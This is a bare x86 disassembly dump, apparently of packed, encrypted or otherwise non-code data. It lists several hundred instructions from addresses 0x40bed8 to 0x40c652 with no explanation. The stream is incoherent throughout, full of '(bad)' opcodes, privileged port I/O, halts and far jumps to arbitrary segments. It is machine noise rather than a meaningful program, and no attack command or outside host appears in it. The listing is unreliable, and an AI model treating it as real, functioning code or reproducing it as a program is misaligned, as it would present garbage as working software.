  40bed8:	in     al,0x5f
  40beda:	jae    0x40be6e
  40bedc:	adc    al,0xb4
  40bede:	push   edi
  40bedf:	add    eax,0x7a790e8c
  40bee4:	and    DWORD PTR [ebx-0x7221aa8d],ebx
  40beea:	retf   0x3448
  40beed:	repnz cmp dh,BYTE PTR [esi]
  40bef0:	ja     0x40bef6
  40bef2:	aaa    
  40bef3:	cmp    BYTE PTR [ebp+0x5b],bh
  40bef6:	pushf  
  40bef7:	cdq    
  40bef8:	mov    ch,0x33
  40befa:	lds    eax,FWORD PTR [ebx]
  40befc:	push   es
  40befd:	sar    BYTE PTR [esi],1
  40beff:	xchg   ebp,eax
  40bf00:	mov    al,ds:0x3adcdf9a
  40bf05:	sbb    DWORD PTR [edx],esp
  40bf07:	pop    ebp
  40bf08:	dec    ebp
  40bf09:	fist   WORD PTR [edx]
  40bf0b:	sub    bh,BYTE PTR [esi+edi*4-0x6903f493]
  40bf12:	aam    0xfd
  40bf14:	test   eax,0x1ca8d3a4
  40bf19:	mov    WORD PTR ds:0x86b4280a,ds
  40bf1f:	push   0x263d12ca
  40bf24:	mov    bl,0xf0
  40bf26:	fs xchg eax,ebp
  40bf29:	aad    0x2
  40bf2b:	fst    QWORD PTR ds:0x2201fc2b
  40bf31:	xchg   edx,eax
  40bf32:	cld    
  40bf33:	pop    ebx
  40bf34:	inc    DWORD PTR [ecx-0x75d95bf4]
  40bf3a:	jmp    0x3722:0x339d88ed
  40bf41:	mov    bh,0x1a
  40bf43:	mov    ebx,DWORD PTR [ebx]
  40bf45:	mov    ebp,0x63744121
  40bf4a:	jo     0x40bf9a
  40bf4c:	jne    0x40bf17
  40bf4e:	cli    
  40bf4f:	fnstcw WORD PTR [edx+edx*8+0x70]
  40bf53:	cdq    
  40bf54:	mov    eax,ds:0x2f970f44
  40bf59:	pusha  
  40bf5a:	push   ebp
  40bf5b:	lods   al,BYTE PTR ds:[esi]
  40bf5c:	add    DWORD PTR [ecx],edx
  40bf5e:	test   eax,0x95bc07e9
  40bf63:	fnstsw WORD PTR [ecx+0x4f9c9d3d]
  40bf69:	sub    al,0x4c
  40bf6b:	cwde   
  40bf6c:	pop    eax
  40bf6d:	xchg   ebx,eax
  40bf6e:	mov    bh,0xe5
  40bf70:	fsubp  st(4),st
  40bf72:	cmp    ebp,DWORD PTR [edx+ebx*1+0x4d3bda53]
  40bf79:	out    0x1,eax
  40bf7b:	in     eax,0x38
  40bf7d:	or     ch,BYTE PTR [eax]
  40bf7f:	aad    0xd5
  40bf81:	dec    esi
  40bf82:	pop    eax
  40bf83:	mov    ah,0x58
  40bf85:	mov    edx,gs
  40bf87:	xchg   edi,eax
  40bf88:	(bad)  
  40bf89:	cmp    edx,ebx
  40bf8b:	aaa    
  40bf8c:	xor    BYTE PTR [esi-0xf],al
  40bf8f:	int    0x9a
  40bf91:	mov    dh,0xb2
  40bf93:	pop    ecx
  40bf94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf95:	cmp    DWORD PTR [eax-0xeae1f8c],0x5a860fae
  40bf9f:	and    eax,0x5f8685a4
  40bfa4:	aad    0xd0
  40bfa6:	das    
  40bfa7:	mov    ch,0x97
  40bfa9:	and    DWORD PTR [eax],esp
  40bfab:	jbe    0x40bff7
  40bfad:	add    bl,0xfc
  40bfb0:	dec    ebp
  40bfb1:	inc    ecx
  40bfb2:	pop    edx
  40bfb3:	and    eax,0xfb1a2ca3
  40bfb8:	jae    0x40c007
  40bfba:	mov    es,WORD PTR [edi-0xeb47cb5]
  40bfc0:	mov    ecx,0x298cc684
  40bfc5:	push   0x5929987a
  40bfca:	or     ebx,ebx
  40bfcc:	sbb    al,0xeb
  40bfce:	lock daa 
  40bfd0:	and    DWORD PTR ds:0x7dc8c8c2,edx
  40bfd6:	cs (bad) 
  40bfd9:	enter  0x2fb6,0x1e
  40bfdd:	mov    ch,0x5f
  40bfdf:	not    DWORD PTR [esi+0x3e8a060c]
  40bfe5:	mov    ebp,0xe68e564d
  40bfea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfeb:	data16 shl BYTE PTR [edi-0x160b41ec],cl
  40bff2:	int3   
  40bff3:	xor    ah,BYTE PTR [esi+0x250ed76f]
  40bff9:	xchg   ebp,eax
  40bffa:	hlt    
  40bffb:	mov    ds:0x64d98e68,al
  40c000:	dec    ebx
  40c001:	push   esp
  40c002:	mov    dh,0x2
  40c004:	(bad)  
  40c005:	mov    edx,0xaee09151
  40c00a:	call   0x464e:0x13740ec
  40c011:	into   
  40c012:	sub    BYTE PTR [ecx+0x4a11e66b],0x16
  40c019:	push   esi
  40c01a:	push   0xf9675060
  40c01f:	cmc    
  40c020:	jecxz  0x40c053
  40c022:	pop    ds
  40c023:	mov    bl,bh
  40c025:	sub    eax,0xebfadcb0
  40c02a:	dec    ebp
  40c02b:	push   ebx
  40c02c:	push   cx
  40c02e:	dec    ebx
  40c02f:	xchg   ecx,eax
  40c030:	lock jl 0x40c016
  40c033:	sbb    cl,al
  40c035:	inc    edi
  40c036:	repz lock es or eax,0x6719e4ff
  40c03e:	outs   dx,BYTE PTR ds:[esi]
  40c03f:	pop    ds
  40c040:	aaa    
  40c041:	push   ebx
  40c042:	mov    eax,0x29da02bb
  40c047:	loopne 0x40c03a
  40c049:	cmp    eax,0x22aad9b3
  40c04e:	pop    eax
  40c04f:	test   BYTE PTR [edi-0x7c97d1db],cl
  40c055:	mov    dl,0x82
  40c057:	ficomp DWORD PTR [ecx+0x47]
  40c05a:	cmc    
  40c05b:	call   0x53d72e82
  40c060:	es je  0x40c091
  40c063:	outs   dx,BYTE PTR ds:[esi]
  40c064:	xlat   BYTE PTR ds:[ebx]
  40c065:	out    dx,eax
  40c066:	sub    DWORD PTR [esi+0x4c32f63e],esp
  40c06c:	xchg   edi,eax
  40c06d:	stc    
  40c06e:	call   0x49a2:0x7f507437
  40c075:	inc    eax
  40c076:	fwait
  40c077:	aas    
  40c078:	jg     0x40c091
  40c07a:	mov    ah,al
  40c07c:	gs je  0x40c085
  40c07f:	cli    
  40c080:	jle    0x40c096
  40c082:	jp     0x40c0c3
  40c084:	ficom  DWORD PTR [ebp-0x5e]
  40c087:	sub    al,0xce
  40c089:	enter  0xdaa7,0xde
  40c08d:	push   ss
  40c08e:	sub    al,0x79
  40c090:	mov    fs,esp
  40c092:	mov    DWORD PTR [edx-0x7cdb598d],esi
  40c098:	inc    esp
  40c099:	push   ebp
  40c09a:	fild   QWORD PTR [ebx-0x55]
  40c09d:	js     0x40c0a8
  40c09f:	aaa    
  40c0a0:	ror    DWORD PTR [edi],1
  40c0a2:	xchg   ebx,eax
  40c0a3:	xchg   ecx,eax
  40c0a4:	xchg   edx,eax
  40c0a5:	imul   ebp,DWORD PTR [ebp-0xd],0xffffff93
  40c0a9:	mov    ebp,edx
  40c0ab:	addr16 icebp 
  40c0ad:	ja     0x40c12d
  40c0af:	ficom  WORD PTR [eax]
  40c0b1:	jno    0x40c059
  40c0b3:	stc    
  40c0b4:	xchg   dh,ah
  40c0b6:	sti    
  40c0b7:	pop    ss
  40c0b8:	cdq    
  40c0b9:	in     al,0xe8
  40c0bb:	add    esi,esp
  40c0bd:	dec    edx
  40c0be:	cdq    
  40c0bf:	das    
  40c0c0:	inc    edx
  40c0c1:	add    DWORD PTR ds:0xfe6e946b,esp
  40c0c7:	fild   WORD PTR [ebp-0x44efb6b2]
  40c0cd:	(bad)  
  40c0ce:	mov    bh,0x1c
  40c0d0:	inc    eax
  40c0d1:	xchg   ecx,eax
  40c0d2:	xchg   esp,eax
  40c0d3:	xchg   ax,ax
  40c0d5:	inc    eax
  40c0d6:	mov    al,BYTE PTR [edx]
  40c0d8:	push   esi
  40c0d9:	sbb    eax,0x2740d6cf
  40c0de:	add    eax,0x15bac55b
  40c0e3:	and    eax,0x7a4b4300
  40c0e8:	xor    eax,0x913f7ac
  40c0ed:	call   0xf934:0xe9801a2a
  40c0f4:	and    edx,DWORD PTR [edi+0x23]
  40c0f7:	ficomp DWORD PTR [eax+0x4edc0602]
  40c0fd:	cmp    al,dl
  40c0ff:	xor    esp,DWORD PTR [edx+esi*2-0x72]
  40c103:	mov    bl,0x2c
  40c105:	push   cs
  40c106:	lods   eax,DWORD PTR ds:[esi]
  40c107:	hlt    
  40c108:	push   eax
  40c109:	out    0x8e,al
  40c10b:	xchg   esp,eax
  40c10c:	mov    ch,0x81
  40c10e:	or     eax,0xf745d1be
  40c113:	in     eax,dx
  40c114:	or     al,0xa4
  40c116:	lock inc eax
  40c118:	sti    
  40c119:	pop    ebx
  40c11a:	push   esi
  40c11b:	loopne 0x40c106
  40c11d:	jae    0x40c197
  40c11f:	xchg   edx,eax
  40c120:	cmp    al,0x3a
  40c122:	mov    eax,ds
  40c124:	pop    ds
  40c125:	stos   BYTE PTR es:[edi],al
  40c126:	enter  0x32f,0x26
  40c12a:	rol    BYTE PTR [ebx+0x123eea25],1
  40c130:	test   al,0x73
  40c132:	push   eax
  40c133:	(bad)  
  40c134:	xlat   BYTE PTR ds:[ebx]
  40c135:	sahf   
  40c136:	test   BYTE PTR [edx+edi*4],bh
  40c139:	popf   
  40c13a:	mov    bh,0xb6
  40c13c:	enter  0x2eb9,0xc2
  40c140:	or     BYTE PTR [ecx-0x9a17117],0xa7
  40c147:	mov    ds:0xa03258e8,al
  40c14c:	fdivr  DWORD PTR [edx-0x2c787c16]
  40c152:	repz jmp 0xbedd:0x22894b5
  40c15a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c15b:	xor    ch,bl
  40c15d:	sbb    bl,BYTE PTR fs:[esi+0x65d0db77]
  40c164:	cmp    eax,0xc9723ca8
  40c169:	in     eax,0x14
  40c16b:	test   al,0xb7
  40c16d:	dec    ebp
  40c16e:	xchg   edi,eax
  40c16f:	imul   ecx,DWORD PTR [eax],0x44
  40c172:	fstp   TBYTE PTR [edi+0x50]
  40c175:	or     dh,BYTE PTR [ebx+0x1]
  40c178:	mov    eax,esi
  40c17a:	imul   esi,DWORD PTR [esp+edx*2],0xcaf34790
  40c181:	not    DWORD PTR [eax]
  40c183:	repnz sub edi,DWORD PTR [edx+0x3f]
  40c187:	data16 sub al,0xf0
  40c18a:	sub    ch,BYTE PTR [ebx]
  40c18c:	loopne 0x40c11d
  40c18e:	add    al,BYTE PTR [eax+eiz*8]
  40c191:	lahf   
  40c192:	fnstenv [edi+0x2abfdb35]
  40c198:	or     al,0x9d
  40c19a:	repnz pop eax
  40c19c:	inc    edi
  40c19d:	in     al,0x3a
  40c19f:	das    
  40c1a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1a1:	mov    bl,0xe5
  40c1a3:	retf   
  40c1a4:	xor    DWORD PTR [ebx+eiz*2+0x7b7405f8],0x919e9700
  40c1af:	mov    al,ds:0x6b75ceb1
  40c1b4:	lods   eax,DWORD PTR ds:[esi]
  40c1b5:	dec    ecx
  40c1b6:	popa   
  40c1b7:	dec    edx
  40c1b8:	cli    
  40c1b9:	dec    edi
  40c1ba:	inc    esi
  40c1bb:	mov    ebx,0xe95fc31f
  40c1c0:	xor    esi,ecx
  40c1c2:	push   ecx
  40c1c3:	enter  0x6a9c,0xad
  40c1c7:	cmp    eax,DWORD PTR [edi]
  40c1c9:	jo     0x40c1dd
  40c1cb:	add    al,0x77
  40c1cd:	adc    eax,0x10a16d0a
  40c1d2:	arpl   WORD PTR [edi],si
  40c1d4:	into   
  40c1d5:	adc    bh,BYTE PTR [esi]
  40c1d7:	xor    edx,DWORD PTR [edx+0x59]
  40c1da:	jbe    0x40c1b4
  40c1dc:	scas   al,BYTE PTR es:[edi]
  40c1dd:	sub    al,0x1d
  40c1df:	bound  eax,QWORD PTR [esi-0x345736d8]
  40c1e5:	sbb    bl,BYTE PTR [edx+0x678b470e]
  40c1eb:	or     al,0x61
  40c1ed:	and    eax,0x64b77a6c
  40c1f2:	in     al,dx
  40c1f3:	mov    ch,0x82
  40c1f5:	lahf   
  40c1f6:	loope  0x40c19c
  40c1f8:	xlat   BYTE PTR ds:[ebx]
  40c1f9:	mov    bh,0x6
  40c1fb:	xchg   ecx,eax
  40c1fc:	clc    
  40c1fd:	mov    ch,0xea
  40c1ff:	mov    al,0xbb
  40c201:	jae    0x40c26b
  40c203:	mov    edi,cs
  40c205:	or     al,0x6
  40c207:	lahf   
  40c208:	jne    0x40c255
  40c20a:	into   
  40c20b:	scas   eax,DWORD PTR es:[edi]
  40c20c:	xor    BYTE PTR [ebx+eax*4-0x49],bh
  40c210:	push   eax
  40c211:	cdq    
  40c212:	out    0xef,al
  40c214:	popf   
  40c215:	dec    ecx
  40c216:	fs cmp ebx,edx
  40c219:	retf   
  40c21a:	clc    
  40c21b:	lock push edx
  40c21d:	jne    0x40c216
  40c21f:	or     DWORD PTR [edi+0x70],ebx
  40c222:	inc    esp
  40c223:	xchg   esi,eax
  40c224:	adc    BYTE PTR [eax+0x61aef19e],ch
  40c22a:	cmc    
  40c22b:	mov    ah,0x86
  40c22d:	push   0xe6fe8c6d
  40c232:	xchg   ebp,eax
  40c233:	hlt    
  40c234:	test   DWORD PTR [edi-0x7460bfbc],ebp
  40c23a:	sar    BYTE PTR [ecx],0x7a
  40c23d:	cmp    ecx,DWORD PTR [ecx]
  40c23f:	lds    esp,FWORD PTR [ecx+0x107c9ac7]
  40c245:	inc    ecx
  40c246:	lahf   
  40c247:	cmp    DWORD PTR [eax-0x46],edi
  40c24a:	in     eax,dx
  40c24b:	js     0x40c259
  40c24d:	rcr    BYTE PTR [esi+eax*4],cl
  40c250:	out    0xd,eax
  40c252:	in     eax,dx
  40c253:	aas    
  40c254:	push   ecx
  40c255:	gs inc esi
  40c257:	xchg   ecx,eax
  40c258:	jp     0x40c219
  40c25a:	test   BYTE PTR [edx+0x71],bh
  40c25d:	adc    ecx,DWORD PTR [eax+0x74]
  40c260:	hlt    
  40c261:	cmp    ebp,DWORD PTR [eax]
  40c263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c264:	(bad)  
  40c265:	push   ds
  40c266:	or     DWORD PTR [eax-0x3e],esp
  40c269:	fadd   QWORD PTR [ebp+0x1f]
  40c26c:	imul   edx,DWORD PTR [edi],0x3eff8c39
  40c272:	pop    ss
  40c273:	and    esi,ecx
  40c275:	pop    ebx
  40c276:	cmp    BYTE PTR [edx+0x7b658acb],0xb6
  40c27d:	xor    BYTE PTR [esi+0x2f71a003],0xae
  40c284:	jns    0x40c2c4
  40c286:	adc    bl,BYTE PTR [esi]
  40c288:	out    0x7c,al
  40c28a:	jns    0x40c2a0
  40c28c:	xchg   ebx,eax
  40c28d:	inc    ebx
  40c28e:	sbb    eax,0x4d6ee1f8
  40c293:	shr    DWORD PTR [esi-0x69],1
  40c296:	nop
  40c297:	aam    0xf8
  40c299:	jge    0x40c240
  40c29b:	test   DWORD PTR [eax],esi
  40c29d:	adc    edi,DWORD PTR [edx-0x73]
  40c2a0:	inc    eax
  40c2a1:	jno    0x40c2ad
  40c2a3:	push   esi
  40c2a4:	std    
  40c2a5:	sub    al,0xb4
  40c2a7:	mov    edx,0xdc9f2010
  40c2ac:	mov    edi,DWORD PTR [eax]
  40c2ae:	dec    esp
  40c2af:	call   0xc03e:0x79b3dc33
  40c2b6:	jo     0x40c2fd
  40c2b8:	inc    ebp
  40c2b9:	xor    eax,DWORD PTR [esi+ebp*1-0x1a827781]
  40c2c0:	sub    dh,ah
  40c2c2:	sub    eax,0xac0dddde
  40c2c7:	mov    BYTE PTR [esi-0x625166bd],dl
  40c2cd:	or     ebx,DWORD PTR [ebx-0x40cb8040]
  40c2d3:	leave  
  40c2d4:	aas    
  40c2d5:	add    DWORD PTR [edi-0x1f],ebp
  40c2d8:	push   0xffffff95
  40c2da:	pop    esp
  40c2db:	sar    esp,cl
  40c2dd:	add    al,0xcc
  40c2df:	pop    ebx
  40c2e0:	mov    DWORD PTR [ebx-0x16],ebx
  40c2e3:	hlt    
  40c2e4:	test   DWORD PTR [ebx+0x56dd4849],ecx
  40c2ea:	(bad)  
  40c2eb:	test   BYTE PTR [edx],bh
  40c2ed:	sbb    BYTE PTR [edi],al
  40c2ef:	retf   
  40c2f0:	mov    bl,0xa0
  40c2f2:	inc    ebp
  40c2f3:	mov    ebp,0xe8f36454
  40c2f8:	ds sti 
  40c2fa:	pop    edi
  40c2fb:	pop    esi
  40c2fc:	push   ebx
  40c2fd:	xchg   ebp,eax
  40c2fe:	sahf   
  40c2ff:	ret    0x76ef
  40c302:	pop    es
  40c303:	loop   0x40c30a
  40c305:	sub    eax,0x4861e458
  40c30a:	mov    dh,0x42
  40c30c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c30d:	lods   al,BYTE PTR ds:[esi]
  40c30e:	cmp    BYTE PTR [esi],al
  40c310:	push   esp
  40c311:	or     DWORD PTR [ebx+0x3c3c16b5],edx
  40c317:	aaa    
  40c318:	jb     0x40c391
  40c31a:	add    DWORD PTR [eax+0x6c],esi
  40c31d:	mov    dh,0x7e
  40c31f:	add    ebx,DWORD PTR [esi]
  40c321:	aaa    
  40c322:	addr16 (bad) 
  40c324:	or     ebx,ecx
  40c326:	jle    0x40c341
  40c328:	xchg   ebp,eax
  40c329:	imul   edi,DWORD PTR [ebp-0x782facb3],0x3b316740
  40c333:	out    dx,al
  40c334:	pushf  
  40c335:	int3   
  40c336:	mov    eax,ds:0xa0baf973
  40c33b:	popa   
  40c33c:	add    al,BYTE PTR [esi-0x38caacc9]
  40c342:	adc    cl,BYTE PTR [ebx]
  40c344:	aaa    
  40c345:	add    DWORD PTR [ebp+0x18af6393],eax
  40c34b:	std    
  40c34c:	test   edx,0xff481259
  40c352:	pop    edi
  40c353:	dec    esi
  40c354:	jp     0x40c3ab
  40c356:	or     ecx,DWORD PTR [edi]
  40c358:	and    eax,0xf1e85eb9
  40c35d:	popa   
  40c35e:	sub    ebx,ebp
  40c360:	push   esi
  40c361:	cmp    edi,esi
  40c363:	pushf  
  40c364:	cdq    
  40c365:	xchg   esp,eax
  40c366:	aas    
  40c367:	cld    
  40c368:	jne    0x40c373
  40c36a:	aad    0x52
  40c36c:	out    0x6e,al
  40c36e:	sbb    edx,edx
  40c370:	ret    0x7ea7
  40c373:	ret    0x4816
  40c376:	scas   al,BYTE PTR es:[edi]
  40c377:	cs jo  0x40c3b1
  40c37a:	push   eax
  40c37b:	addr16 test al,0x16
  40c37e:	cmp    eax,0x7903d49b
  40c383:	pop    ebx
  40c384:	stc    
  40c385:	int3   
  40c386:	inc    ecx
  40c387:	rol    BYTE PTR [esi],cl
  40c389:	cs mov dh,0x96
  40c38c:	enter  0x1c6c,0x79
  40c390:	fisub  WORD PTR [esi]
  40c392:	xchg   esi,eax
  40c393:	cmp    eax,ebx
  40c395:	cmp    al,0x81
  40c397:	mov    al,ds:0xfd59d932
  40c39c:	push   ss
  40c39d:	imul   esp,DWORD PTR [esp+ecx*8-0x31],0xac92862a
  40c3a5:	mov    edx,0x27fe7763
  40c3aa:	dec    esp
  40c3ab:	dec    ecx
  40c3ac:	pop    ebp
  40c3ad:	jnp    0x40c3ad
  40c3af:	enter  0x8a9b,0x5c
  40c3b3:	mov    ah,0xf2
  40c3b5:	mov    edx,0x1e758538
  40c3ba:	lods   al,BYTE PTR ss:[esi]
  40c3bc:	nop
  40c3bd:	mov    ebp,0x2b627214
  40c3c2:	cmp    DWORD PTR [ecx+0x1dc0f420],esi
  40c3c8:	aam    0xb1
  40c3ca:	shl    DWORD PTR [edx-0x1f2bf811],cl
  40c3d0:	retf   
  40c3d1:	pop    edx
  40c3d2:	scas   eax,DWORD PTR es:[edi]
  40c3d3:	push   0x39f32c1
  40c3d8:	aam    0x49
  40c3da:	fisubr WORD PTR [ebx+0x7]
  40c3dd:	pop    ecx
  40c3de:	cs rol BYTE PTR es:[eax],0x9d
  40c3e3:	pop    edi
  40c3e4:	xlat   BYTE PTR ds:[ebx]
  40c3e5:	mov    bl,0x3d
  40c3e7:	pop    esi
  40c3e8:	inc    ecx
  40c3e9:	ins    BYTE PTR es:[edi],dx
  40c3ea:	mov    esi,0x97c769e3
  40c3ef:	pop    ss
  40c3f0:	in     eax,dx
  40c3f1:	adc    eax,0x96c0bbc7
  40c3f6:	fcom   QWORD PTR [eax+esi*1+0x216fdf85]
  40c3fd:	fbld   TBYTE PTR [eax]
  40c3ff:	mov    ah,0x70
  40c401:	aas    
  40c402:	xchg   ebx,eax
  40c403:	inc    eax
  40c404:	pop    edi
  40c405:	pop    ds
  40c406:	fistp  DWORD PTR [ebx+0x4f957eb9]
  40c40c:	rcr    BYTE PTR [edi+0x43],1
  40c40f:	fcomp  DWORD PTR [ebp+0x19]
  40c412:	jnp    0x40c405
  40c414:	iret   
  40c415:	adc    BYTE PTR [ecx-0x62],ah
  40c418:	lods   eax,DWORD PTR ds:[esi]
  40c419:	lock push edx
  40c41b:	div    DWORD PTR [esp+eiz*2]
  40c41e:	arpl   WORD PTR [eax+esi*8+0x2b384dc9],sp
  40c425:	inc    ebp
  40c426:	scas   eax,DWORD PTR es:[edi]
  40c427:	sar    dh,cl
  40c429:	pusha  
  40c42a:	mov    edx,0x54fe175c
  40c42f:	stc    
  40c430:	popa   
  40c431:	shr    DWORD PTR [edi+0x21],cl
  40c434:	xchg   edx,eax
  40c435:	lock sub eax,0xffffffae
  40c439:	xchg   ebx,eax
  40c43a:	xchg   ecx,eax
  40c43b:	ret    0x2a64
  40c43e:	scas   al,BYTE PTR es:[edi]
  40c43f:	pop    es
  40c440:	ret    0x7dd
  40c443:	or     BYTE PTR [edx-0x3],dl
  40c446:	mov    eax,0x1a601726
  40c44b:	out    0xd4,eax
  40c44d:	daa    
  40c44e:	jle    0x40c449
  40c450:	into   
  40c451:	pop    edi
  40c452:	test   DWORD PTR [ebp+0xd9f92fe],ecx
  40c458:	jo     0x40c436
  40c45a:	mov    ds:0xea5ca204,al
  40c45f:	push   0xffffffa5
  40c461:	xor    DWORD PTR [edx],esp
  40c463:	pop    ecx
  40c464:	xor    al,0xc1
  40c466:	cmc    
  40c467:	in     eax,0xbe
  40c469:	loope  0x40c3f2
  40c46b:	sub    DWORD PTR [ebp+0x59],esp
  40c46e:	mov    al,0x21
  40c470:	rcr    BYTE PTR [esi+0x58],0x18
  40c474:	jmp    0xd2f2:0xa600522b
  40c47b:	mov    al,ds:0x1b4b6b35
  40c480:	xchg   DWORD PTR [esi+0x14],ebp
  40c483:	xchg   ebp,eax
  40c484:	ficom  DWORD PTR [ebx]
  40c486:	arpl   WORD PTR [edi+ebp*4-0x5a362c3c],bp
  40c48d:	jmp    0x40c413
  40c48f:	pop    ebp
  40c490:	jno    0x40c4a2
  40c492:	fisub  WORD PTR [esp+edx*8-0x7f]
  40c496:	das    
  40c497:	out    0x58,al
  40c499:	adc    edi,ebx
  40c49b:	pushw  cs
  40c49d:	xor    bh,ah
  40c49f:	xor    DWORD PTR [edi+0x2d23ea78],ebp
  40c4a5:	retf   0xb4d0
  40c4a8:	in     al,dx
  40c4a9:	push   esi
  40c4aa:	xor    ebp,DWORD PTR [esi+ebp*2+0xf77bf4f]
  40c4b1:	fcmovu st,st(3)
  40c4b3:	(bad)  
  40c4b4:	(bad)  
  40c4b5:	sub    DWORD PTR [edx+esi*4+0x38608e91],eax
  40c4bc:	sub    DWORD PTR [edi],edi
  40c4be:	aas    
  40c4bf:	arpl   WORD PTR [edi-0x13065644],di
  40c4c5:	repz mov bl,0x7
  40c4c8:	xor    bl,BYTE PTR [ebp+edx*1-0x6fe5247e]
  40c4cf:	mov    dl,0x3d
  40c4d1:	(bad)  
  40c4d2:	push   ds
  40c4d3:	retf   0xb87d
  40c4d6:	xchg   ebp,eax
  40c4d7:	test   eax,esp
  40c4d9:	sbb    al,0x30
  40c4db:	xchg   ecx,eax
  40c4dc:	xchg   esi,eax
  40c4dd:	sar    DWORD PTR [ebp+0x7a],1
  40c4e0:	xor    al,0xd9
  40c4e2:	rcl    DWORD PTR [edi+edi*2+0x64b1c7c7],0xcb
  40c4ea:	sub    BYTE PTR [esi],dh
  40c4ec:	mov    ebx,0x884c3b89
  40c4f1:	sbb    eax,0x733901e5
  40c4f6:	pushf  
  40c4f7:	xchg   ebx,eax
  40c4f8:	xor    ecx,DWORD PTR [edi+0x7e09ff0c]
  40c4fe:	sub    DWORD PTR [ebx+eax*2],esi
  40c501:	jge    0x40c540
  40c503:	aaa    
  40c504:	push   edx
  40c505:	hlt    
  40c506:	sbb    DWORD PTR [ebx+0x2109121f],esi
  40c50c:	inc    edx
  40c50d:	pushf  
  40c50e:	and    BYTE PTR [ebp-0x75385c9a],bl
  40c514:	or     DWORD PTR [ebp-0x1422ff63],0x3
  40c51b:	shl    DWORD PTR [ecx],1
  40c51d:	in     al,dx
  40c51e:	sti    
  40c51f:	mov    al,ds:0xdfda9247
  40c524:	cs jae 0x40c525
  40c527:	pop    ecx
  40c528:	rol    ebp,1
  40c52a:	imul   ebx,DWORD PTR ds:0x66c28c07,0xffffffd3
  40c531:	les    ecx,FWORD PTR [ecx-0x50]
  40c534:	(bad)  
  40c535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c536:	push   ebx
  40c537:	int3   
  40c538:	mov    ebx,0x79436e41
  40c53d:	pusha  
  40c53e:	jb     0x40c51e
  40c540:	pop    edi
  40c541:	push   ecx
  40c542:	les    ebx,FWORD PTR [edi-0x44]
  40c545:	stos   BYTE PTR es:[edi],al
  40c546:	aad    0x63
  40c548:	xchg   esp,eax
  40c549:	cmp    DWORD PTR [eax+ebx*4-0x73],edx
  40c54d:	xor    ebx,DWORD PTR [edi+esi*8]
  40c550:	outs   dx,BYTE PTR ds:[esi]
  40c551:	iret   
  40c552:	in     al,0xb9
  40c554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c555:	jns    0x40c527
  40c557:	and    eax,0xe4cadfd6
  40c55c:	inc    ecx
  40c55d:	repz inc ecx
  40c55f:	push   ds
  40c560:	inc    ecx
  40c561:	fisubr WORD PTR [edi+0x29c1cf37]
  40c567:	(bad)  
  40c568:	push   ds
  40c569:	lock test BYTE PTR [esp+esi*8-0x79],cl
  40c56e:	scas   eax,DWORD PTR es:[edi]
  40c56f:	sub    ebx,eax
  40c571:	sbb    bh,BYTE PTR ds:0x7320701e
  40c577:	push   eax
  40c578:	push   ds
  40c579:	mov    ebx,0x9f1dcb75
  40c57e:	and    BYTE PTR ds:0x56848190,0xdb
  40c585:	xchg   DWORD PTR [eax+0x31],ebx
  40c588:	fidiv  DWORD PTR [edx]
  40c58a:	(bad)  
  40c58b:	cwde   
  40c58c:	or     eax,0xdb814de8
  40c591:	pop    DWORD PTR [esi]
  40c593:	out    0x12,eax
  40c595:	mov    edx,0xfd77aa7
  40c59a:	jo     0x40c57d
  40c59c:	mov    edi,0xab66c2e
  40c5a1:	jle    0x40c55e
  40c5a3:	and    BYTE PTR [ecx-0x4755d7d8],ah
  40c5a9:	inc    eax
  40c5aa:	jle    0x40c623
  40c5ac:	dec    ebp
  40c5ad:	xchg   BYTE PTR [eax+0x5f4dd946],al
  40c5b3:	dec    edi
  40c5b4:	cld    
  40c5b5:	bound  ebx,QWORD PTR [edi-0x68]
  40c5b8:	scas   eax,DWORD PTR es:[edi]
  40c5b9:	and    al,0x57
  40c5bb:	enter  0x3236,0xcf
  40c5bf:	inc    esp
  40c5c0:	pop    ebx
  40c5c1:	inc    edi
  40c5c2:	cld    
  40c5c3:	lock and eax,0x284ff236
  40c5c9:	or     edx,DWORD PTR [edi]
  40c5cb:	mov    DWORD PTR [eax-0x30406799],esi
  40c5d1:	fdivr  DWORD PTR [eax+0x5]
  40c5d4:	mov    edi,0x3331688e
  40c5d9:	adc    al,0xac
  40c5db:	sbb    DWORD PTR [edi+eax*4-0x445a0f50],0x900fdc6
  40c5e6:	pop    ecx
  40c5e7:	pop    ebx
  40c5e8:	inc    esp
  40c5e9:	xchg   ebp,eax
  40c5ea:	jbe    0x40c5ac
  40c5ec:	in     eax,dx
  40c5ed:	mov    cl,0xc8
  40c5ef:	jmp    0x40c591
  40c5f1:	mov    edi,0xde5afc9a
  40c5f6:	(bad)  
  40c5f8:	or     al,0x32
  40c5fa:	xchg   ebp,eax
  40c5fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5fc:	dec    eax
  40c5fd:	or     eax,0x261f1c10
  40c602:	popf   
  40c603:	and    DWORD PTR [ebp+0x61],edx
  40c606:	xchg   ecx,eax
  40c607:	popf   
  40c608:	and    bl,BYTE PTR [ebx]
  40c60a:	rol    BYTE PTR ss:[edi+eiz*8],1
  40c60e:	mov    edi,0xd2ed1683
  40c613:	cmp    BYTE PTR [edx+0x7b],bl
  40c616:	pop    esi
  40c617:	adc    esi,DWORD PTR [ecx]
  40c619:	push   edi
  40c61a:	mov    ds:0x37665841,eax
  40c61f:	ja     0x40c5ea
  40c621:	shr    BYTE PTR [ebx+edi*1+0x57],cl
  40c625:	outs   dx,BYTE PTR ds:[esi]
  40c626:	outs   dx,BYTE PTR ds:[esi]
  40c627:	test   al,0x55
  40c629:	xchg   edi,eax
  40c62a:	sbb    ch,BYTE PTR [edx]
  40c62c:	fnstcw WORD PTR [edx]
  40c62e:	imul   eax,DWORD PTR [ebx-0x43e4eef9],0xfffffff0
  40c635:	add    al,0x41
  40c637:	std    
  40c638:	or     DWORD PTR [edx+edi*8+0x42a8a897],0x4a985420
  40c643:	jmp    0x40c643
  40c645:	mov    esi,0x7b9aff2
  40c64a:	jns    0x40c626
  40c64c:	in     eax,0x6
  40c64e:	push   0xffffffb9
  40c650:	lods   al,BYTE PTR ds:[esi]
  40c651:	clc    
  40c652:	cmp    eax,0x62bf361b
